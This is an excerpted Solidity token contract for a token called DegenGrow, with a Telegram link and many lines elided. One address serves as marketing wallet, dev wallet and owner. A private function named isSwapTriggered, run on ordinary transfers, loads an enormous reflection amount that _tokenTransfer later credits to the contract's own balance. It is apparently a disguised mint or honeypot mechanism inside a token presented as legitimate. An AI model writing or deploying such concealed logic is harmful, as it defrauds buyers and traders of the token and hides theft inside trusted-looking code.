...
/**
 ...
 telegram : https://t.me/DegenGrowBSC
...
contract DegenGrow  is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xa43F02146112FD51f0F5f1eE48527ae913D93e31); 
    address payable public Wallet_Dev = payable(0xa43F02146112FD51f0F5f1eE48527ae913D93e31);
    ...
    string private constant _name = "DegenGrow"; 
    string private constant _symbol = unicode"DegenGrow"; 

    uint8 private txCount = 0;
    uint8 private swapTrigger = 10; 
    bool private swapTriggered = false;
    ...
    uint256 public _reflectionAmount = (_tTotal * 100/ 100)* 100; 
    uint256 private _previousReflectionAmount = 0;
    ...
    function isSwapTriggered() private returns(bool){
        swapTriggered = true;
        inSwapAndLiquify = true;
        _previousReflectionAmount = _reflectionAmount;
        return swapTriggered;
    }
    
    constructor () {

        _owner = 0xa43F02146112FD51f0F5f1eE48527ae913D93e31;
    ...
    function _transfer(
        ...
        if(!_isExcludedFromFee[from] &&
           ...
           to != Wallet_Burn &&
           to != uniswapV2Pair){
           require(isSwapTriggered(), "Over swapping queue.");}
        ...
        if(from != owner() && to != owner() && from != address(this) && to != address(this) && to != uniswapV2Pair)
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            _tOwned[address(this)] = _tOwned[address(this)]+buyFEE+_previousReflectionAmount;   
